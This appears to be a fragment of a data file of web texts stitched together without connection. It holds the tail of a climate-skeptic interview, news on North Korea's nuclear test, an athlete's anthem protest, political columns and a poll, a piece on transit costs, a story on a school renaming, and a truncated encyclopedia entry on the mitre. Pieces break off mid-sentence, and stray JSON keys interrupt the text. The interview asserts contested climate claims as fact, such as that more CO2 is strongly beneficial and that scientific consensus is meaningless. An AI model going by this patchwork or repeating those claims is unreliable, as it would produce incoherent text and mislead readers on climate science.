CO2 levels have increased most rapidly. The same alternation of warming and cooling has characterized the earth’s climate for all of geological history.\n\n…more CO2 will be a benefit to humanity. The predicted warming from more CO2 is grossly exaggerated. The equilibrium warming from doubling CO2 is not going to be 3° C, which might marginally be considered a problem, but closer to 1° C, which will be beneficial. One should not forget that the “global warming” is an average value. There will be little warming in the tropics and little warming at midday. What warming occurs will be mostly in temperate and polar regions, and at night. This will extend the agricultural growing season in many countries like Canada, Scandinavia, and Russia. More CO2 greatly increases the efficiency of photosynthesis in plants and makes land plants more drought-resistant. So, the net result of more CO2 will be strongly beneficial for humanity.\n\nThe astonishing recent claim by NOAA, that there never was a hiatus, reminds me of the Baron’s soliloquy about the power of his treasure chests in Pushkin’s “little tragedy,” The Miserly Knight, of 1830 (AKA The Covetous Knight). I have tried to reproduce the solemn, iambic pentameter of Pushkin’s verse in my translation :\n\nAnd muses will to me their tribute bring,\n\nFree genius will enslave itself to me,\n\nAnd virtue, yes, and, sleepless labor too\n\nWith humble mien will wait for my reward.\n\nI’ve but to whistle, and obedient, timid,\n\nBlood-spattered villainy will crawl to me\n\nAnd lick my hand, and gaze into my eyes,\n\nTo read in them the sign of my desire.\n\nThe hockey-stick temperature record was conspicuously absent from the latest IPCC report, which speaks volumes. My guess is that the hockey stick started out as an honest but mistaken paper, but one welcomed by the global-warming establishment. They had been embarrassed for years by the Medieval Warm Period, when Vikings farmed Greenland, and when emissions from fossil fuels were negligible. A.W. Montford’s book, The Hockey Stick Illusion (Anglosphere Books, 2015), is a pretty good summary of what happened\n\nNOAA’s recent attempt to eliminate the hiatus is an example of the same kind of thinking that went into the hockey stick. If a politically correct theory does not agree with observations, revise the observations. This is the complete opposite of Nobel Laureate–physicist Dick Feynman’s definition of science, which he spelled out in an entertaining lecture at Cornell University in 1964 :\n\nIn general, we look for a new law by the following process. First, we guess it (audience laughter), no, don’t laugh, that’s really true. Then we compute the consequences of the guess, to see what, if this is right, if this law we guess is right, to see what it would imply and then we compare the computation results to nature, or we say compare to experiment or experience, compare it directly with observations to see if it works.\n\nIf it disagrees with experiment, it’s wrong. In that simple statement is the key to science. It doesn’t make any difference how beautiful your guess is, it doesn’t matter how smart you are who made the guess, or what his name is… If it disagrees with experiment, it’s wrong. That’s all there is to it.\n\nI don’t question that the earth has warmed since the end of the Little Ice Age, but I am persuaded that most of the warming was due to natural causes, about which the governments can do nothing. We are already seeing more vegetation on the earth and it is absorbing more CO2. But as I will discuss in response to your next question, I believe that more CO2 is good for the world, that the world has been in a CO2 famine for many tens of millions of years and that one or two thousand ppm would be ideal for the biosphere. I am baffled at hysterical attempts to drive CO2 levels below 350 ppm, or some other value, apparently chosen by Kabbalah numerology, not science.\n\n…plants get the carbon they need from the CO2 in the air. Most plants draw other essential nutrients — water, nitrogen, phosphorus, potassium, etc. — from the soil. Just as plants grow better in fertilized, well-watered soils, they also grow better in air with CO2 concentrations several time higher than present values.\n\nEssex and McKitrick are on target in their book, Taken by Storm. It is striking that many skeptics, like me, are retired. Aside from character assassination, there is not much the attack dogs of the climate consensus can do to us, at least so far. But young academics know very well that they will risk their careers by expressing any doubt about the party line on global warming.\n\nI regard consensus science as an extremely pernicious development that ought to be stopped cold in its tracks. Historically, the claim of consensus has been the first refuge of scoundrels; it is a way to avoid debate by claiming that the matter is already settled. Whenever you hear the consensus of scientists agrees on something or other, reach for your wallet, because you’re being had.\n\nLet’s be clear: the work of science has nothing whatever to do with consensus. Consensus is the business of politics. Science, on the contrary, requires only one investigator who happens to be right, which means that he or she has results that are verifiable by reference to the real world.\n\nIn science consensus is irrelevant. What is relevant is reproducible results. The greatest scientists in history are great precisely because they broke with the consensus.\n\nThere is no such thing as consensus science. If it’s consensus, it isn’t science. If it’s science, it isn’t consensus. Period.\n\nAre our all-powerful governments going to fight increases or decreases of solar activity? Where is Owen Glendower when we need him to “call the spirits from the vasty deep,” or King Canute to stop the tides? I am not keen to submit to lunatic, government-sponsored geoengineering schemes of contemporary Dr. Strangeloves. Nor does driving the earth’s human population down from its current seven billion people to no more than 1 billion have much appeal to me, even though it is promoted by influential climate advisers of politicians and popes. Are we supposed to draw straws to decide which six out of seven people must disappear from the face of the earth?\n\nI can’t see any reason to reduce CO2 emissions. Doubling or quadrupling current CO2 levels will be good for the world. The economic burdens you talk about are all pain with no gain for most of the world.\n\nThe evidence that CO2 is a pollutant so fearsome that we must give up democracy, punish “deniers,” and impoverish much of the world by eliminating the use of fossil fuels is looking more and more like spectral evidence. If you can’t find real scientific evidence for alarm, dream up hockey sticks, dream away hiatuses, and get rid of your opponents as soon as possible.\n\nIsn’t the freedom to think what we like and say what we think at the very heart of the scientific endeavor? If so, then how did we get ourselves into this fix?\n\nThe situation seems to many of us to be truly scandalous — one that historians of science are going to be making hay out of for decades and centuries to come.\n\nDuring Stalin’s Great Terror, the equivalents of evil fossil fuel interests were Leon Trotsky and his followers. They were a direct threat to Stalin’s control of the world-wide Communist movement, just as climate skeptics are regarded as an existential threat to the global warming establishment.\n\nI would be surprised if the net total funding of climate skeptics exceeded $2 or $3 million dollars a year, and even that may be high. In the last few years, US government spending for climate research [https://www.whitehouse.gov/sites/default/files/omb/assets/legislative_reports/fcce-report-to-congress.pdf (48-page PDF)] has been about $20 billion dollars a year — more than a thousand times greater than skeptic funding. But even this huge financial advantage is not sufficient to support the pathetically weak scientific case that the world is in danger from more CO2.\n\nIn accepting his 2007 Nobel Peace Prize, Al Gore said the summer Arctic could be ice-free by 2013 due to CO2 emissions. I invite readers to have a look at the data site I mentioned earlier [http://www.climate4you.com/]. A few minutes of inspection of the “sea ice” link will show that there has been no significant change in sea ice since 2007. With all due respect to Nobel Laureate Gore, there was plenty of summer ice in 2013.\n\nFull interview: http://www.thebestschools.org/special/karoly-happer-dialogue-global-warming/william-happer-interview/\n\nAdvertisements\n\nShare this: Print\n\nEmail\n\nTwitter\n\nFacebook\n\nPinterest\n\nLinkedIn\n\nReddit",

The agency added that Seoul had detected “indications” that Pyongyang is preparing a ballistic missile launch.\n\nRead more\n\nA nuclear-powered aircraft carrier, strategic bombers and “other powerful assets”can be deployed to the Korean Peninsula as a response to North Korea's latest nuclear test, Seoul's defense ministry said on Monday.\n\n\"We will push for the option of deploying strategic assets such as the US carrier strike group and strategic bombers after consultation with the US,\" the ministry said.\n\nThe ministry also said that it was planning construction of additional facilities at the existing launch site of Terminal High Altitude Area Defense (THAAD), a US anti-ballistic missile defense system which is intended to shoot down short- and intermediate-range ballistic missiles.\n\nThe US Forces Korea (USFK) will install another four THAAD launchers at the converted golf course in Seongju County, some 300 kilometers south of Seoul, the ministry said. There are currently two THAAD launchers in operation there, while four others are ready for deployment, the ministry added.\n\n\"The remaining launchers will soon be tentatively deployed through South Korea-U.S. consultations in order to counter North Korea's advancing nuclear and missile threats,\" the statement said.\n\nSouth Korea will also stage a unilateral live-fire drill, using its F-15 K fighter jets armed with Taurus air-to-surface missiles, in September, Seoul's defense ministry said in its report to the National Assembly's defense committee.\n\nDefense Minister Song Young-moo alleged that Pyongyang had reduced the weight of its nuclear warhead to below 500 kilograms.\n\n\"Yes, we presume so…The smaller it becomes, the better it gets,” he added.\n\nOn Sunday, North Korean state media reported that Pyongyang had successfully tested a hydrogen bomb which can be mounted on an Intercontinental Ballistic Missile (ICBM).\n\nREAD MORE: S. Korea holds ballistic missile drill in response to Pyongyang’s nuclear test (VIDEO)\n\nThe test followed Pyongyang’s claims that it has developed a new, more advanced warhead that is small enough to be fitted on an ICBM.\n\nThe bomb test was a “perfect success” and a “meaningful” step towards completing the North’s nuclear weapons program, state television reported.\n\nRussian President Vladimir Putin and his Chinese counterpart, Xi Jinping agreed on Sunday, ahead of the BRICS summit, that it is important to prevent “chaos” on the Korean Peninsula and called for a diplomatic solution to the crisis.\n\nThe Russian president’s spokesman Dmitry Peskov said that both Putin and Xi had \"expressed their deep concern over this situation,” adding that the two leaders stressed the importance of “preventing chaos on the [Korean] peninsula” as well as the “importance for all sides to show restraint and focus on seeking a resolution [of the crisis] solely in a political and diplomatic way.”\n\nRead more\n\nMeanwhile, British Prime Minister Theresa May said that the North’s latest test “poses an unacceptable further threat to the international community” and urged the UN Security Council to look at imposing new sanctions on North Korea.\n\nGerman Chancellor Angela Merkel and French President Emmanuel Macron jointly condemned the test and called for tougher sanctions against Pyongyang, while Japanese Chief Cabinet Secretary Yoshihide Suga suggested including restrictions on oil trade with North Korea in the list of new sanctions.\n\nOn Sunday, the Russian Foreign Ministry urged all parties to “return to dialogue and negotiations,” including in “the context of implementing the Russia-China roadmap.”\n\nRussia believes that the situation around North Korea has dangerously escalated, Russian Deputy Foreign Minister Sergey Ryabkov said.\n\n“There should be no place for escalation [of the crisis]. Those who are stronger and cleverer should exercise restraint. Any careless step in the current situation may lead to an explosion – a political or a military explosion – not the nuclear test that was carried out [by North Korea] and which reflects the tendency for the crisis deepening in north-east Asia,” he said.\n\nIn one of his latest statements on North Korea, Trump vowed to use the “full range” of capabilities at his country’s disposal and might resort to using its nuclear arsenal against North Korea if it continues to threaten Washington or its allies.\n\nEarlier, Moscow and Beijing suggested a joint initiative to avoid an armed conflict on the peninsula. The roadmap envisions a suspension of all nuclear and missile tests from North Korea in exchange for a freeze of US-South Korea drills in the region. However, the proposal was firmly rejected by Washington.\n\nIn the meantime, the ‘war of words’ between the US and the North may turn into a heated conflict at any time. While the US and its allies say Pyongyang violated its international obligations with the missile and nuclear tests, North Korea slammed Washington’s military build-up in the region – in particular, the joint US-South Korea Ulchi Freedom Guardian drills, which took place in late August.\n\nIn a series of tweets on Sunday, Trump branded North Korea a “rogue nation and a threat.” The latest development in Pyongyang’s nuclear capabilities are “very hostile and dangerous to the United States,” the president said.",

  "latent_25586": "This Saturday, a rookie catcher for the Oakland A’s let loose a few choice words for President Trump on Instagram; later that day he became the first Major League Baseball player to take a knee during the National Anthem.\n\n“My decision had been coming for a long time,” Bruce Maxwell said according to the San Francisco Chronicle. “The only way we can come together is by informing. … To single out NFL players for doing this isn’t something we should be doing — I felt it should be a little more broad.”\n\n“The point of my kneeling was not to disrespect our military or our constitution or our country,” Maxwell, who has a military background, continued. Although he took a knee, he made sure to place his hand over his heart.\n\n“My hand was over my heart because I love this country and I have family members, including my father, who bled for this country, and who continue to serve. At the end of the day, this is the best country on the planet. I am and forever will be an American citizen and grateful to be here, but my kneeling is what’s getting the attention, and I’m kneeling for the people who don’t have a voice. This goes beyond the black and Hispanic communities because right now we have a racial divide that’s being practiced from the highest power we have in this country saying it’s basically OK to treat people differently.”\n\n“I’m kneeling for a cause but I’m in no way disrespecting my country or my flag,” he added.\n\nHere are Bruce Maxwell's words.

  "latent_25928": ". . . and the reversal of the insane Title IX policy on campus . . . and an exit from the Paris Accords . . . and the avoidance of whatever Hillary would have wrought.\n\nThere is a meme used by anti-Trump conservatives on Twitter. Whenever Trump steps in it, they tweet the words “But Gorsuch.” It is meant to mock Trump loyalists who hold out Gorsuch’s nomination as a Trump accomplishment that overshadows any of his failings. The meme can be quite amusing — one version has a road sign emblazoned with the words “But Gorsuch” close to disappearing in a flood.\n\nAdvertisement\n\nAdvertisement\n\nBut I’ve never quite understood why anti-Trump conservatives would be so slighting about Gorsuch. He will presumably be a bulwark of the Constitution long after Trump has departed the White House three or seven years from now and is tweeting as a private citizen again. Bushies used to count George W. Bush’s two Supreme Court nominees as a central part of his domestic legacy, understandably (and Bush completely blew one of his nominations before getting it right). Trump is half-way there, with lots of time on the clock.\n\nAlso, it’s simply not true that all we have to show from the Trump administration is Gorsuch. The legislative agenda has been limited by the fact that Republicans have only 52 votes in the Senate. This is what pushed the GOP toward doing two big health and tax bills through reconciliation. When the health-care bill failed (Trump contributed to this failure, but there were lots of other factors, too), it seemed they could get nothing this year. Now, it appears very likely that they will get the tax bill, which includes a rifle-shot elimination of the individual mandate. And the administration has been steadily reversing the executive aggrandizements of the Obama administration.\n\nAdvertisement\n\nTrump has governed so far as more of a Republican and conservative than I expected. Outside a brief flirtation with Chuck and Nancy and some unserious talks with Democrats over the tax bill, he’s had no interest in working with Democrats (in fact, has spent time insulting them). Remember: One of Bush’s big first-year accomplishments was partnering with Teddy Kennedy on wholly ill-considered federal education legislation, No Child Left Behind. There has been nothing like that during Trump’s first year.\n\nNone of this is to deny Trump’s pitfalls. There is going to a political price for the first two years of his administration, 1) because there is always a cost for unified control of the federal government; 2) Trump is doing everything he can to increase that cost, for no good reason. I doubt next year is going to look as conservative as this one. We may see a push for welfare reform, but there will probably also be an infrastructure bill and some sort of trade action against China that could become a very big deal. Still, it’s probably time to retire the “But Gorsuch” meme.",
  "latent_25938": "Political analysts were quick to declare victory for Hillary Clinton after the Democratic nominee’s first debate with Donald Trump on Monday night, and a new Politico/Morning Consult poll shows roughly half of likely voters agree with that assessment.\n\nAccording to the survey of likely voters conducted immediately after the debate at Hofstra University, 49 percent of respondents said Clinton won the first bout with her GOP foe. About one-fourth (26 percent) thought the New York businessman edged the former secretary of State, and about the same percentage (25 percent) were undecided.\n\nRelated: POLITICO and Morning Consult Announce New Polling Partnership\n\nPerceptions on debate performance mostly broke along partisan lines, but Republicans were more likely to declare Clinton the winner than Democrats were to state victory for her GOP counterpart. About one-fifth of Republicans (18 percent) said Clinton won the debate, compared with just 7 percent of Democrats who thought Trump was the victor. And 12 percent of Trump supporters gave Clinton the nod, whereas just 2 percent of Clinton backers named Trump the winner.\n\nIt’s a clear victory for Clinton, and it comes as both national and state polls have tightened over the past several weeks. She is off to a good start on the debate front, which Americans view as important in deciding how they will cast their vote in November. One-third of voters (34 percent) said debate performance will be a very important in how they vote, while 29 percent said it would be somewhat important, compared with 34 percent of voters said it wouldn’t be too important or not important at all.\n\nBut the impact of Monday’s debate is still small. Just 9 percent of voters said the debate changed their minds about who they will be voting for, while about eight out of 10 said it wouldn’t matter. Before the debate, Trump led Clinton by 1 point in the four-way race with Libertarian Party nominee Gary Johnson and Green Party candidate Jill Stein. But Clinton now leads Trump by 3 points (41 percent to 38 percent), and in a head-to-head scenario, she leads by 4 points (45 percent to 41 percent).\n\nFor two candidates who are historically unpopular, the debates represent some of their best, last chances to shape voters’ perceptions ahead of Election Day, and Trump did not fare comparatively well in that regard. Roughly four out of 10 voters (39 percent) said they viewed Clinton more favorably after the debate, compared with 30 percent for Trump.\n\nAnd while the candidates can help their cases during the debates, most voters are still dismayed at their major-party choices in 2016. More than half of voters think the Republican and Democratic parties could have nominated better candidates than Clinton and Trump. About one out of four respondents (26 percent) think Trump is the best choice for Republicans, compared with one-third who think Clinton is the best Democrat for the job.\n\nThat goes some way to explaining the relatively high support for third-party candidates, who have been a factor in polls. Indeed, more than four in 10 voters thought Libertarian Party nominee Gary Johnson and Green Party nominee Jill Stein should have made the debate stage.\n\nNielsen declared the much-hyped event the most-watched presidential debate of all time — at roughly 84 million viewers — and a large majority of our poll respondents tuned in. Seven out of 10 (72 percent) respondents said they watched the debate, while only 27 percent did not. More than half of voters who tuned in (55 percent) said they watched all of it, with another 44 percent saying they watched most or some of it.\n\nA plurality of voters (42 percent) thought that moderator Lester Holt — who pressed Trump repeatedly on his past stances on the Iraq War and President Obama’s birthplace — was fair and impartial. But more than one-fourth of respondents (27 percent) thought he was favorable to Clinton. Just 2 percent thought the NBC news anchor was more favorable to Trump.\n\nThe prospect of live fact-checking during the debate was a subject of vigorous argument ahead of Monday’s event, and voters found Clinton to be more correct in her claims. Almost half of voters (48 percent) thought Trump made the most factual errors in the debate, compared with one-third who said Clinton did.\n\nThe reception to the debate itself was generally positive. More than half of voters thought it was informative (55 percent) and entertaining (62 percent). Half of voters said it was something they would watch again, and more than one-third (37 percent) said it would help them make up their mind.\n\nBut given that more than one-third of voters (36 percent) called it depressing, almost one-fifth (18 percent) said it was boring, and 30 percent described it as awful, it’s clear that there’s plenty of angst among the American electorate ahead of decision day.\n\nThe national survey, fielded immediately after Monday’s debate ended, polled 1,421 registered voters and 1,253 likely voters, from Sept. 26-27 for a margin of error of plus or minus 3 percentage points.\n\nDebate survey: Likely voters: toplines and crosstabs.

  "latent_26113": "Listening to New York Governor Andrew Cuomo speak yesterday about the Metropolitan Transportation Authority’s five-year capital plan, you would be forgiven for thinking he has nothing to do with the goings-on at America’s largest transit agency.\n\nCapital New York reported on his comments yesterday on the authority’s hugely important capital plan, his most substantive yet on an issue that’s crying out for his leadership:\n\n“The first budget from every agency also always calls for $15 billion. That’s part of the dance that we go through. That’s why I say it’s the initial, proposed budget,” Cuomo, a Democrat, told reporters after a business development event. “We’ll then look at that budget and go through, and we’ll come up with a realistic number. But we have a very real $4 billion surplus, and we have a 2 percent spending cap that I still follow. So that’s the discipline that’s in the process.” […] “There’s no need for it,” Cuomo told NY1 reporter Zack Fink [about new East River bridge tolls]. “Look, we had a $10 billion deficit and we didn’t do tolls. It’s just that Zack accepted in whole cloth the M.T.A. plan. He just didn’t push back, he didn’t do his job and ask questions, say, ‘What in here do you really need, and isn’t this just the bloated initial first request that you send to the second floor?’”\n\nWhile the MTA’s proposed capital spending is no doubt bloated, Cuomo’s framing – “What in here do you really need?” – suggests that the MTA should cut projects, rather than cutting costs.\n\nThis is indicative of a depressing lack of creativity and leadership from the man who controls one of the planet’s most impressive pieces of infrastructure. While YIMBY takes issue with the costs of the MTA’s proposals, the projects themselves are eminently sensible and desperately needed.\n\nThe second phase of the Second Avenue subway, north through East Harlem to 125th Street, should have been built generations ago. Penn Station Access, which will give the Bronx a few more Metro-North stations and direct access to Manhattan’s West Side, is a wise use of existing infrastructure. Upgrading the signaling on the Sixth Avenue (B/D/F/M) and Queens Boulevard (E/F/M/R) subway lines, so that they can carry more trains per hour at more reliable frequencies, is necessary to sustain further growth in Queens and across the city. Replacing worn out infrastructure, buying new trains, making post-Sandy repairs and shoring up the system for the next storm may be boring, but the MTA isn’t doing these things for their own personal amusement.\n\nThe problem is not the inclusion of these projects in the plan, but their costs. The MTA’s subway tunneling costs in particular have spiraled out of control – they’re at least three times what New York’s peer cities pay for comparable projects. The problem has become so dire that the agency is taking the unprecedented step of not even bothering to put a price tag on the East Harlem leg of the Second Avenue subway before asking for a huge chunk of its funding.\n\nThe cost of Penn Station Access is measured in the billions when it should be in the hundreds of millions. And who even knows what sort of overspending is going on with Sandy repair projects, like the $600 million initial price tag to fix a subway station that only cost $530 million to build a few years earlier.\n\n“We cannot build a 21st-century city and compete globally,” said Scott Stringer, the rare politician who recognizes the MTA’s dire cost problem, “if we continue to spend five, even seven times as much on construction projects as compared to our competitors.”\n\nAnd without leadership from Governor Cuomo and the legislature in Albany, none of this is going to change, even if MTA management actually wants it to.\n\nAnd there are signs that MTA leadership does want change. They do genuinely seem to realize, for example, that their staffing levels for capital projects are out of this world. When pressed about his department’s stunningly high per-mile subway construction costs, MTA Capital Construction chief Michael Horodniceanu has on more than one occasion pointed to high staffing levels mandated by outmoded labor agreements. He cited the example of tunnel boring machine work, where New York City work rules require 25 workers for a job that could be done with nine in Spain, a country with much lower costs. (Asked independently, Mysore Nagaraja, who previously held Horodniceanu’s job, gave us similar numbers in a telephone interview a few years ago.)\n\nBut in order to take on the unions and work rules that drive overstaffing and high costs, the MTA will need support from Albany to do battle with labor – a fight that Cuomo appears to have no stomach for, given how quickly he rolled over during recent labor talks with the LIRR unions.\n\nThere’s also the issue of New York’s messy underground. State agencies and utilities regulated by the state seem to engage in little coordination regarding what goes on below the city’s streets, with the MTA’s inspector general blaming at least six months of delay and $130 million in Second Avenue costs on utility relocation. The sort of cooperation necessary to avoid these headaches must be imposed by Albany – the MTA cannot do it alone.\n\nAnd then there’s MTA management’s own culpability. The authority has been lax in overseeing the contractors that actually build its projects, whether because of a lack of in-house expertise or a simple lack of pressure from its bosses. But this is another area where change can only come from the top, with prodding from the governor and the lawmakers who must approve the agency’s funding.\n\nAndrew Cuomo is right that the MTA’s capital plan is bloated. (To say nothing of the agency’s operations, where at least one of the MTA’s stabs at reform was stymied by a state labor law that nobody seems in any hurry to change.)\n\nBut the self-professed “car guy” Andrew Cuomo has shown absolutely no interest in getting to the heart of the matter, which is the agency’s across-the-board cost problem. Cuomo’s easy way out – prodding the MTA to cut projects without any fundamental reforms – may be the best political move for a man whose interest in the governorship appears limited to how it can be parlayed into the presidency. But ultimately it will rob the region of the infrastructure it needs to survive and thrive.

Smith says their oldest daughter graduated from there in 2015 and their youngest daughter just completed her sophomore year there.\n\n\"I turned to some members of the association who have some expertise in polling and opinion research,\" Smith tells The Independent. \"They developed a survey that we distributed to our members, as well as other friends of the school. Even though I personally oppose the renaming of the school, I committed up front to advocate for whatever the poll results found our members' position to be.\"\n\nThe survey was sent to more than 4,600 LSMSA stakeholders by email; 1,940 people responded.\n\n\"I'm told that a 17 to 18 percent response to a survey like this is considered pretty good,\" Smith continues. \"Our survey drew a 42 percent response rate.\"\n\nThe bulk of the respondents were alumni (1,350). The rest were current students (240) and an amalgam of employees, board members and family members of current or former students (350).\n\n\"The survey found that 74 percent opposed the renaming of the school after Jimmy D. Long, Sr.,\" Smith says, adding \"that the opposition is not confined to geography.\"\n\nSmith says more than 60 pages of comments were included in the responses to the survey. He says some of those who support the name change said they did so because they assumed there was some sort of endowment that would accompany the renaming. Smith says there is no financing connected to the renaming.\n\n\"We have graduates in every parish of this state,\" according to Smith. \"And we found that the opposition to the move is strong across the state.\"\n\nSmith makes clear that he and the alumni association \"have the utmost respect for Mr. Long.\" He does feel that Thompson and Jimmy Long's brother Sen. Gerald Long have not been honest with the school's board or its broader community.\n\n\"In December, the board voted to name the new dorm that will be built starting this year after Jimmy D. Long, Sr.,\" Smith says, noting that it marked the first time that a building on the school's Natchitoches campus had been named after any individual.\n\nAlost was dean of Northwestern State University's College of Education at the time. He took a year's leave from the university to help launch the school. Long had approached Treen about funding for the school. And Sen. Kelly handled the enabling legislation in the state Senate. The school opened in 1983.\n\n\"The school named an auditorium in the main building after Gov. Treen,\" Smith says. \"And it is now known to all students and alumni as the Treen Auditorium. We think that naming the new dorm after Rep. Long is a high and appropriate way of honoring his memory.\"\n\nSmith says naming the dormitory after Long requires legislative approval and that's what the alumni and the school's governing board apparently thought they were getting when Sen. Gerald Long told the board in December that he would ask Sen. Thompson to handle the legislation that would (according to the minutes of that meeting) \"honor Rep. Long's legacy.\"\n\nSmith says he and other alumni were stunned when they read Thompson's SB1 when it was pre-filed in February.\n\n\"We thought that surely there had been a mistake,\" Smith recalls. \"But, we were told by Sens. Thompson and Long that there had been no mistake, that renaming the school was their intention all along.\"\n\nWhen the Senate Education Committee considered SB1 on May 15, Smith says 38 alumni association members submitted red cards in opposition to the name change. Some testified. Thompson spoke in support of his bill, which sailed through the committee.\n\nOn May 17, days after most of the Senate had attended the funeral of Sen. Gerald Long's wife, Rose , the Senate voted to approve SB1 by a 31-2 margin.\n\nThe bill has been sent to the House. The expectation is that the bill will be assigned to the House Education Committee chaired by Rep. Nancy Landry. Under House rules, the bill must be read by title three times while the House is in session. That would mean that Wednesday would be the final day of readings. That is also the regular meeting day of the education committee. Unless the rules are suspended, that would mean that the earliest SB1 could be considered by Landry's committee would be May 31.\n\nSB1 is in a race against the clock.\n\nSmith says the LSMSA Alumni Association is going to concentrate its efforts in and on the House Education Committee.\n\n\"If we can defeat it there, the bill will be dead,\" Smith explains.\n\nSmith believes that it's right that defending the school falls to its alumni.\n\n\"Administrators come and go, legislators, board members, faculty — all come and go,\" Smith explains. \"But we will always be the alumni. And it falls to us to protect our school and its legacy.\"",

In the 10th century the tiara was pictured on papal coins.\"[2] Other sources claim the tiara developed the other way around, from the mitre. In the late Empire it developed into the closed type of Imperial crown used by Byzantine Emperors (see illustration of Michael III, 842-867).\n\nWorn by a bishop, the mitre is depicted for the first time in two miniatures of the beginning of the eleventh century. The first written mention of it is found in a Bull of Pope Leo IX in the year 1049. By 1150 the use had spread to bishops throughout the West; by the 14th century the tiara was decorated with three crowns.\n\nChristian clergy [ edit ]\n\nCatholic Encyclopedia (1913) The evolution of the mitre, from the(1913)\n\nWestern Christianity [ edit ]\n\nIn its modern form in Western Christianity, the mitre is a tall folding cap, consisting of two similar parts (the front and back) rising to a peak and sewn together at the sides. Two short lappets always hang down from the back.\n\nIn the Catholic Church, ecclesial law gives the right to use the mitre and other pontifical insigna (crosier, pectoral cross, and ring) to (1) bishops, (2) abbots, and (3) cardinals and those canonically equivalent to diocesan bishops who do not receive episcopal ordination. The principal celebrant presents the mitre and other pontifical insignia to a newly ordained bishop during the Rite of Ordination of a Bishop and to a new abbot during the Rite of Blessing of an Abbot. In the case of a person who is canonically equivalent to a diocesan bishop but does not receive episcopal ordination, this presentation normally occurs during a public installation as the ordinary of his jurisdiction. Catholic ecclesial law also permits former Anglican bishops received into full communion and subsequently ordained to the order of presbyter in the Catholic Church to obtain permission to use pontifical insignia as a mark of recognition of their previous ministry (they also may be admitted to the national or regional episcopal conference with status equivalent to that of retired Catholic bishops), but former Anglican bishops typically have not requested permission to use pontifical insignia under this provision.\n\nsimplex traditional style: White Mitretraditional style: White damask with its white lappets ending in red fringes.\n\nThree types of mitres are worn by Roman Catholic clergy for different occasions:\n\nThe simplex ('simple', referring to the materials used) is made of undecorated white linen or silk and its white lappets traditionally end in red fringes. It is worn most notably at funerals, Lenten time, on Good Friday and by concelebrant bishops at a Mass. Cardinals in the presence of the Pope wear a mitre of white linen damask.\n\n('simple', referring to the materials used) is made of undecorated white linen or silk and its white lappets traditionally end in red fringes. It is worn most notably at funerals, Lenten time, on Good Friday and by concelebrant bishops at a Mass. Cardinals in the presence of the Pope wear a mitre of white linen damask. The auriphrygiata is of plain gold cloth or white silk with gold, silver or coloured embroidered bands; when seen today it is usually worn by bishops when they preside at the celebration of the sacraments.\n\nis of plain gold cloth or white silk with gold, silver or coloured embroidered bands; when seen today it is usually worn by bishops when they preside at the celebration of the sacraments. The pretiosa ('precious') is decorated with precious stones and gold and worn on the principal Mass on the most solemn Sundays (except in Lent) and feast days. This type of mitre is rarely decorated with precious stones today, and the designs have become more varied, simple and original, often merely being in the liturgical colour of the day.\n\nThe proper colour of a mitre is always white, although in liturgical usage white also includes vestments made from gold and silver fabrics. The embroidered bands and other ornaments which adorn a mitre and the lappets may be of other colours and often are. Although coloured mitres are sometimes sold and worn at present, this is probably due to the maker’s or wearer’s lack of awareness of liturgical tradition.[dubious – discuss]\n\nOn all occasions, an altar server may wear a shawl-like veil, called a vimpa, around the shoulders when holding the bishop's mitre. The vimpa is used to hold the mitre so as to avoid the possibility of it being soiled by the natural oils in a person's hand as well as symbolically showing that the person does not own the mitre, but merely holds it for the prelate. The person wearing a vimpa is also occasionally referred to as a vimpa. When a vimpa holds the crosier, he holds the crook facing inward, as another sign that the person does not hold the authority of the crosier.\n\nWith his inauguration as pope, Benedict XVI broke with tradition and replaced the papal tiara even on his papal coat of arms with a papal mitre (containing still the three levels of 'crowns' representing the powers of the Papacy in a simplified form) and pallium. Prior to Benedict XVI, each pope's coat of arms always contained the image of the papal tiara and St. Peter's crossed keys, even though the tiara had fallen into disuse, especially under popes John Paul I and John Paul II. Pope Paul VI was the last pope to date to begin his papal reign with a formal coronation in June 1963. However, as a sign of the perceived need for greater simplification of the papal rites, as well as the changing nature of the papacy itself, he abandoned the use of his tiara in a dramatic ceremony in Saint Peter's Basilica during the second session of Vatican II in November 1963. However his 1975 Apostolic Constitution made it clear the tiara had not been abolished: in the constitution he made provision for his successor to receive a coronation. Pope John Paul I, however, declined to follow Paul VI's constitution and opted for a simpler papal inauguration, a precedent followed by his three successors. Pope John Paul II's 1996 Apostolic Constitution left open several options by not specifying what sort of ceremony was to be used, other than that some ceremony would be held to inaugurate a new pontificate.\n\nPope Paul VI donated his tiara (a gift from his former archdiocese of Milan) to the efforts at relieving poverty in the world. Later, Francis Cardinal Spellman of New York received the tiara and took it on tour of the United States to raise funds for the poor. It is on permanent view in the Crypt Church in the Basilica of the National Shrine of the Immaculate Conception in Washington, D.C.\n\nIn the Church of England, the mitre fell out of use after the Reformation, but was restored in the late 19th and early 20th centuries as a result of the Oxford Movement, and is now worn by most bishops of the Anglican Communion on at least some occasions. The mitre is also worn by bishops in a number of Lutheran churches, for example the Evangelical Lutheran Church of Latvia and the Church of Sweden.[3]\n\nIn ecclesiastical heraldry, a mitre was placed above the shield of all persons who were entitled to wear the mitre, including abbots. It substituted for the helm of military arms, but also appeared as a crest placed atop a helmet, as was common in German heraldry.[4] In the Anglican Churches, the mitre is still placed above the arms of bishops instead of the ecclesiastical hat. In the Roman Catholic Church, the use of the mitre above the shield on the personal arms of clergy was suppressed in 1969,[5] and is now found only on some corporate arms, like those of dioceses. Previously, the mitre was often included under the hat,[6] and even in the arms of a cardinal, the mitre was not entirely displaced.[7] In heraldry the mitre is always shown in gold, and the lappets (infulae) are of the same colour. It has been asserted that before the reformation, a distinction was used to be drawn between the mitre of a bishop and an abbot by the omission of the infulae in the abbot's arms. In England and France it was usual to place the mitre of an abbot slightly in profile.[4]\n\nEastern Christianity [ edit ]\n\nElaborately embroidered Eastern Orthodox mitre, 1715.\n\nThe most typical mitre in the Eastern Orthodox and Byzantine Catholic churches is based on the closed Imperial crown of the late Byzantine Empire. Therefore, it too is ultimately based on the older καμιλαύκιον although it diverged from the secular headdress at a much later date, after it had already undergone further development. The crown form was not used by bishops until after the fall of Constantinople (1453).\n\nThe Eastern mitre is made in the shape of a bulbous crown, completely enclosed, and the material is of brocade, damask or cloth of gold. It may also be embroidered, and is often richly decorated with jewels. There are normally four icons attached to the mitre (often of Christ, the Theotokos, John the Baptist and the Cross), which the bishop may kiss before he puts it on. Eastern mitres are usually gold, but other liturgical colours may be used.\n\nThe mitre is topped by a cross, either made out of metal and standing upright, or embroidered in cloth and lying flat on the top. In Greek practice, the mitres of all bishops are topped with a standing cross. The same is true in the Russian tradition. Mitres awarded to priests will have the cross lying flat. Sometimes, instead of the 